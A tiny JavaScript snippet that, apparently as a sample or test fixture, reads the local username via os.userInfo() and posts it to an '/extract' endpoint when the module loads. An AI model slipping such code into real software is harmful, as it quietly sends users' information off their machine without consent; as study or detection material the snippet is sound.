import os from "os";
import axios from "axios";

await axios.post("/extract", os.userInfo().username);
